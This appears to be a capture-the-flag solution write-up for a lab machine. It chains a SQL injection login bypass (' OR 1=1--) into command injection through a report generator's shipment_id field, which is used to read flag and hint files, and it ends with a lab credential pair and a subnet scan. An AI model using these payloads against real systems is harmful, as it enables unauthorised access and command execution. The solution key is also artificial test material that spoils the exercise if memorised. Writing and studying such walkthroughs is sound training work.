# M1 — Red Team Solution: SQL Injection → Auth Bypass → RCE

**Machine:** aglg-portal | **Port:** 80/tcp | **MITRE:** T1190, T1059.004

---

## Step 1 — Reconnaissance

```bash
nmap -sV -p 80 <M1-IP>
# Flask on port 80, navigate to http://<M1-IP>/
```

---

## Step 2 — SQL Injection Auth Bypass

Navigate to `http://<M1-IP>/`. The login form sends a POST to `/login`.

**Payload — username field:**
```
' OR 1=1--
```
**Password field:** `anything`

Full POST:
```
username=' OR 1=1--&password=x
```

This injects into the raw query:
```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password='x'
```
→ Returns `admin` row → session established.

---

## Step 3 — Post-Auth: Report Generator RCE

Navigate to `http://<M1-IP>/report`

The shipment_id parameter is passed directly to `subprocess.run()` as a shell command.

**Payload — shipment_id:**
```
AGX-001; cat /opt/aglg/classified/flag1.txt
```

**Flag is printed in the terminal output panel.**

---

## Step 4 — Read the Hint

```bash
# Via RCE in report generator:
AGX-001; cat /opt/aglg/classified/hint.txt
```

Reveals: `Warehouse API on DMZ:3000 | vendor_ops : V3nd0r@AGLG`

Scan DMZ: `nmap -p 3000 11.0.0.0/8`

---

## Flags obtained
- `FLAG{<hex>_sqli_auth_bypass}` — from `/opt/aglg/classified/flag1.txt`
